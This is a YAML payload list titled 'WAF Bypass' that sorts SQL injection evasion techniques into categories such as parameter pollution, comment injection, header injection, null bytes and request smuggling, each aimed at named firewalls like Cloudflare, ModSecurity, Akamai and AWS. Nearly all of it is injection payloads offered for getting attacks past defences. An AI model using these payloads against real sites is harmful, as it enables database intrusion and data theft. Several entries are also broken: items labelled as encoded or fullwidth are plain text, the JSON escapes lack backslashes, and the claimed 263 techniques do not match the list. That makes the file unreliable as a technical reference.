name: WAF Bypass
description: 263 WAF/EDR bypass techniques compiled from src-hunter research.
categories:
- name: HTTP Parameter Pollution (HPP)
  description: Duplicate params to confuse WAF parsers
  wafs:
  - cloudflare
  - modsec
  - akamai
  - aws
  payloads:
  - ?id=1&id=2&id=3
  - ?id=1&id=2&id=UNION SELECT
  - ?id=1&id=2&id=1' OR '1'='1
  - ?param=1&param=1' UNION SELECT--
  - ?a=1&a=2&a=3&a=4&a=5
- name: HTTP Parameter Fragmentation (HPF)
  description: Split payload across multiple params
  wafs:
  - cloudflare
  - aws
  - imperva
  payloads:
  - ?id=1'/*&name=*/UNION SELECT--
  - ?a=1' UNION/*&b=*/SELECT 1,2--
  - ?x=1'/*&y=*/AND 1=1--
- name: HTTP Parameter Contamination (HPC)
  description: Use different case/encodings for same param
  wafs:
  - cloudflare
  - modsec
  payloads:
  - ?id=1&ID=1' OR '1'='1
  - ?id=1&iD=1 UNION SELECT--
  - ?param=1&PARAM=1'--
- name: Case Switching
  description: Mix uppercase/lowercase to bypass regex
  wafs:
  - cloudflare
  - modsec
  - f5
  - akamai
  payloads:
  - SeLeCt * FrOm users
  - UnIoN SeLeCt 1,2,3
  - oR 1=1--
  - aNd 1=1
  - oRdEr By 3
  - aDmIn' --
- name: URL Encoding
  description: Single/double/over-encoding to bypass signature detection
  wafs:
  - cloudflare
  - modsec
  - aws
  - imperva
  - akamai
  payloads:
  - ''' OR ''1''=''1 (URL encoded once)'
  - ''' OR ''1''=''1 (double URL encoded)'
  - ''' OR ''1''=''1 (triple URL encoded)'
  - SELECT * FROM users
  - 1' ORDER BY 3--
- name: Unicode Bypass
  description: Use Unicode homoglyphs and normalization tricks
  wafs:
  - cloudflare
  - modsec
  - f5
  payloads:
  - SELECT * FROM users (fullwidth)
  - OR 1=1 (Cyrillic lookalikes)
  - UNION SELECT (fullwidth)
- name: Comment Injection
  description: Inject SQL comments to truncate or split signatures
  wafs:
  - cloudflare
  - modsec
  - akamai
  - aws
  - imperva
  payloads:
  - '''/**/OR/**/1=1--'
  - UN/**/ION SEL/**/ECT 1,2
  - ''' OR 1=1 #'
  - 1'/*!50000ORDER*/ BY 3--
- name: Null Byte Injection
  description: Null bytes to truncate parsed strings
  wafs:
  - cloudflare
  - akamai
  - f5
  payloads:
  - ''' OR ''1''=''1%00'
  - admin%00' --
  - SELECT%00*%00FROM%00users
- name: Buffer Overflow
  description: Fill WAF buffer with junk to bypass inspection
  wafs:
  - cloudflare
  - modsec
  - akamai
  - imperva
  payloads:
  - ?id=1 + AAAAA... (8000 chars) + ' OR '1'='1
  - ?id=AAAA... (4000 chars) + 1' UNION SELECT--
  - ''' OR ''1''=''1 + &junk= + BBBB... (10000 chars)'
- name: HTTP Verb Tampering
  description: Use alternative HTTP methods to bypass
  wafs:
  - cloudflare
  - modsec
  - aws
  - akamai
  payloads:
  - HEAD instead of POST
  - PATCH instead of PUT
  - OPTIONS instead of DELETE
- name: Content-Type Mutation
  description: Change Content-Type to bypass parsers
  wafs:
  - cloudflare
  - modsec
  - aws
  - imperva
  payloads:
  - 'Content-Type: application/x-www-form-urlencoded'
  - 'Content-Type: multipart/form-data'
  - 'Content-Type: application/json'
  - 'Content-Type: text/plain'
  - 'Content-Type: application/xml'
- name: Chunked Transfer Encoding
  description: Use TE chunked to bypass WAF body inspection
  wafs:
  - cloudflare
  - modsec
  - f5
  - aws
  payloads:
  - 'Transfer-Encoding: chunked'
  - 'Transfer-Encoding: x-chunked'
- name: HTTP Request Smuggling
  description: CL.TE / TE.CL smuggling attacks
  wafs:
  - cloudflare
  - modsec
  - f5
  - akamai
  - aws
  - imperva
  payloads:
  - CL.TE content-length + transfer-encoding mismatch
  - TE.CL transfer-encoding + content-length mismatch
- name: Line Feed Injection
  description: Inject CR/LF to split WAF parsing
  wafs:
  - cloudflare
  - modsec
  - f5
  payloads:
  - 'X-Custom: 1 (CRLF injection)'
  - 'X-Forwarded-For: 127.0.0.1 (LF injection)'
- name: Header-Based Injection
  description: Inject payloads in less-scanned headers
  wafs:
  - cloudflare
  - modsec
  - aws
  - imperva
  payloads:
  - 'User-Agent: 1'' OR ''1''=''1'
  - 'Referer: 1 UNION SELECT--'
  - 'X-Forwarded-For: 1'' OR 1=1--'
  - 'Cookie: id=1'' OR ''1''=''1'
- name: JSON Unicodescape
  description: Use JSON unicode escapes for WAF bypass
  wafs:
  - cloudflare
  - modsec
  - aws
  payloads:
  - '{"id":"u0027 OR u00271u0027u003du00271"}'
  - '{"q":"u0055u004eu0049u004fu004e SELECT"}'
- name: Hex Encoding
  description: Use hex-encoded values for strings
  wafs:
  - cloudflare
  - modsec
  - f5
  - akamai
  payloads:
  - 0x27204f5220313d312d2d (hex encoded payload)
  - '0x61646d696e (hex: admin)'
  - CHAR(65)+CHAR(68)+CHAR(77)+CHAR(73)+CHAR(78)
- name: Whitespace Obfuscation
  description: Use varied whitespace to bypass
  wafs:
  - cloudflare
  - modsec
  - akamai
  - aws
  - imperva
  - f5
  payloads:
  - SELECT * FROM users (tabs instead of spaces)
  - SELECT * FROM users (newlines between keywords)
  - SELECT * FROM users (multiple spaces)
- name: Operator Substitution
  description: Replace = with LIKE, IN, BETWEEN
  wafs:
  - cloudflare
  - modsec
  - f5
  - aws
  payloads:
  - ''' OR 1 LIKE 1--'
  - ''' OR 1 BETWEEN 0 AND 2--'
  - ''' OR 1 IS NOT NULL--'
- name: Logical Operator Substitution
  description: Replace AND/OR with &&/||
  wafs:
  - cloudflare
  - modsec
  - aws
  - akamai
  payloads:
  - ''' || 1=1 --'
  - ''' && 1=1 --'
